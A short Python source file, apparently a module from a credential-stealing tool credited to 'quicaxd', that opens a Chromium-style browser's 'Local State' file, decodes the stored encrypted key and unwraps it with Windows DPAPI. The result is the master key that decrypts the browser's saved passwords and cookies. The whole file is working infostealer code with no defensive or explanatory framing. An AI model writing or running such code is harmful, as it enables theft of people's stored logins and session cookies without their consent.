import json, win32crypt, base64, os


class getKey:
    def __init__(self) -> None:
        self.value = None
        
    def getkey(self, path, combining) -> None:
        combining = os.path.join(combining, "Local State")
        with open(path + f"\\{combining}", "r", encoding="utf-8", errors="ignore") as qicka:
            crypthon = qicka.read()
            crypthon = json.loads(crypthon)
        chain = self.decode(crypthon["os_crypt"]["encrypted_key"])
        chain = chain[5:] # Remove DPAPI char
        return str(win32crypt.CryptUnprotectData(chain, self.value, self.value, self.value, 0)[1])
    def decode(self, entry) -> None:
        return base64.b64decode(entry)

#Copyright © quicaxd 2023
